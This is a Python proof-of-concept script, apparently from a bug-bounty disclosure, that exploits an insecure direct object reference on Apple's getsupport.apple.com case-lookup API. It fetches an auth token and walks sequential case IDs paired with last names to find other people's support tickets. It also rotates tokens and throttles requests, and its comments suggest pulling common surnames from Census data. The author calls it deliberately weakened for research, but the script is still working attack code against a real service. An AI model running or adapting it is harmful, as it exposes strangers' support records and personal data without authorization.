"""
getsupport.apple.com IDOR Proof of Concept
Author: Richard Hyunho Im (@richeeta)

DISCLAIMER: This is an intentionally nerfed version of the proof of concept I submitted to Apple's Security Bounty Program.
            This script is intended strictly for legitimate educational/research purposes.
            Please don't be an ass and use this script to access support tickets that are not yours.
"""
import requests
import time
import random

def fetch_new_auth_token():
    get_url = 'https://getsupport.apple.com/caselookup/details'
    get_headers = {
        'Sec-Ch-Ua': '"Not(A:Brand";v="24", "Chromium";v="122"',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36',
        'Upgrade-Insecure-Requests': '1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close'
    }
    response = requests.get(get_url, headers=get_headers)
    new_token = response.headers.get('X-APPLE-AUTH-TOKEN')
    if new_token:
        return new_token
    else:
        raise Exception('Failed to fetch new X-APPLE-AUTH-TOKEN :(')
try:
    auth_token = fetch_new_auth_token()
    print("Successfully fetched initial X-APPLE-AUTH-TOKEN! :D")
except Exception as e:
    print(str(e))
    exit()
post_url = 'https://getsupport.apple.com/api/v1/facade/case/details?locale=en_US'
headers = {
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'X-Apple-Auth-Token': auth_token,
    'Sec-Ch-Ua': '"Not(A:Brand";v="24", "Chromium";v="122"',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36',
    'Origin': 'https://getsupport.apple.com'
}
# Case ID numbers are 12 digits, generated sequentially, and increment by 1.
start_id = 102258524999
end_id = 102258520000
success_count = 0
# Most common last names can be pulled from US Census Bureau or 23andMe.
# Please only test your own last name if you're actually running this script.
last_names = ["Randomassname"]
request_counter = 0
for case_id in range(start_id, end_id - 1, -1):
    if success_count >= 1:
        print("Nice! Reached 1 successful HTTP 200 responses ^_^")
        break
    for last_name in last_names:
        payload = {
            "caseOrRepairId": str(case_id),
            "lastName": last_name,
            "serialNumber": ""
        }
        response = requests.post(post_url, json=payload, headers=headers)
        request_counter += 1
        if response.status_code == 200:
            print(f"SWEET! HTTP 200 Match for caseOrRepairId {case_id} with lastName {last_name}")
            success_count += 1
            break
        elif response.status_code not in [400]:
            try:
                print(response.json())
            except ValueError:
                print(response.text)

        time.sleep(random.randint(2, 3))

    if request_counter % 100 == 0:
        try:
            headers['X-Apple-Auth-Token'] = fetch_new_auth_token()
            print(f"Token updated after processing {request_counter} requests.")
        except Exception as e:
            print(str(e))

if success_count < 1:
    print("nooooooooooo didnt work :(")